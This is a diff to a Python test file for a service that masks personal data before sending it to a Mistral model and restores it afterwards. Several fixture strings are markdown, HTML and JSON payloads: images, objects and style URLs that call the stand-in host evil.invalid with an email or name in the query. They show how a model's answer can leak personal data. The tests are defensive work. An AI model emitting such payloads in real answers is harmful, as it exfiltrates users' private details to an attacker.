@@ -12,6 +12,7 @@ NAME = "Jean Dupont"
 IBAN = "FR76 3000 6000 0112 3456 7890 189"
 EMAIL = "jean.dupont@example.com"
 LOCAL = "http://127.0.0.1:8001"
+USER_MESSAGE = {"role": "user", "content": f"Écrire à {NAME} ({EMAIL})."}
 
 
 class Names:
@@ -291,17 +292,12 @@ def test_aliases_inside_links_stay_masked():
         "![e](<https://evil.invalid/a\\>b?q=[PERSON_1]>)",
         "![f]( //evil.invalid/[EMAIL_1].png)",
         "![g](\n//evil.invalid/[EMAIL_1].png)",
-        "![h][r]\n\n[r]: <https://evil.invalid/a b?q=[PERSON_1]>",
         "[r]:\n  //evil.invalid/?q=[EMAIL_1]",
         "> [r]: //evil.invalid/?q=[EMAIL_1]",
         "- [r]: //evil.invalid/?q=[EMAIL_1]",
         "<https://evil.invalid/[EMAIL_1]>",
         "https://evil.invalid/?n=[PERSON_1]",
         "www.evil.invalid/[EMAIL_1]",
-        '<img src="https://evil.invalid/x?[EMAIL_1]">',
-        "<object data=//evil.invalid/[EMAIL_1]>",
-        '<div style="background:url(//evil.invalid/[EMAIL_1])">',
-        "<img\n\nsrc=//evil.invalid/[EMAIL_1]>",
     ]
     for link in links:
         fake = FakeMistral(reply=f"Voir {link} et [PERSON_1].\n\nContact : [PERSON_1], [EMAIL_1].")
@@ -314,12 +310,44 @@ def test_aliases_inside_links_stay_masked():
     assert content == f"Voir [{NAME}](https://site.invalid) ; [EMAIL_1]: écrire."
 
 
+def test_after_raw_html_nothing_more_is_restored():
+    """An HTML block can run across blank lines (`<pre>`, `<style>`) and a `>` inside an
+    attribute defeats counting brackets: from the first tag on, aliases stay masked."""
+    answers = [
+        "<img\n\nsrc=//evil.invalid/[EMAIL_1]>\n\n[PERSON_1]",
+        '<pre><img alt=">" src="https://evil.invalid/c?d=\n\n[EMAIL_1]"></pre>\n\n[PERSON_1]',
+        "<style>\n\nbody{background:url(https:evil.invalid/c?d=[EMAIL_1])}\n</style>",
+        '<img src="https://evil.invalid/x?[EMAIL_1]">\n\n[PERSON_1]',
+        "<object data=//evil.invalid/[EMAIL_1]>\n\n[PERSON_1]",
+        '<div style="background:url(//evil.invalid/[EMAIL_1])">\n\n[PERSON_1]',
+        "![h][r]\n\n[r]: <https://evil.invalid/a b?q=[PERSON_1]>\n\n[EMAIL_1]",
+        '<https://site.invalid> <pre><img alt=">" src="https://evil.invalid/?d=\n\n[EMAIL_1]">',
+    ]
+    for answer in answers:
+        response = ask(bridge(FakeMistral(reply=f"Pour [PERSON_1] : {answer}")), USER_MESSAGE)
+        content = response.json()["choices"][0]["message"]["content"]
+        assert content == f"Pour {NAME} : {answer}", answer
+
+
 def test_aliases_inside_links_stay_masked_in_json_answers():
-    fake = FakeMistral(reply='{"nom": "[PERSON_1]", "lien": "https://evil.invalid/?d=[EMAIL_1]"}')
-    response = ask(
-        bridge(fake),
-        {"role": "user", "content": f"{NAME}, {EMAIL}"},
-        response_format={"type": "json_object"},
-    )
-    content = json.loads(response.json()["choices"][0]["message"]["content"])
-    assert content == {"nom": NAME, "lien": "https://evil.invalid/?d=[EMAIL_1]"}
+    """Shown as markdown, a JSON answer has no blank line where a string holds an escaped one,
+    and a link can start in one string and end in the next: from the first link mark on, in
+    string order, nothing more is restored."""
+    cases = [
+        (
+            {"nom": "[PERSON_1]", "lien": "https://evil.invalid/?d=[EMAIL_1]", "x": "[EMAIL_1]"},
+            {"nom": NAME, "lien": "https://evil.invalid/?d=[EMAIL_1]", "x": "[EMAIL_1]"},
+        ),
+        (
+            {"a": "![x](https://evil.invalid/?q=\n\n[EMAIL_1])"},
+            {"a": "![x](https://evil.invalid/?q=\n\n[EMAIL_1])"},
+        ),
+        (
+            ["[PERSON_1]", "![x](<https://evil.invalid/?q=", "[EMAIL_1]>)"],
+            [NAME, "![x](<https://evil.invalid/?q=", "[EMAIL_1]>)"],
+        ),
+    ]
+    for reply, expected in cases:
+        fake = FakeMistral(reply=json.dumps(reply))
+        response = ask(bridge(fake), USER_MESSAGE, response_format={"type": "json_object"})
+        assert json.loads(response.json()["choices"][0]["message"]["content"]) == expected
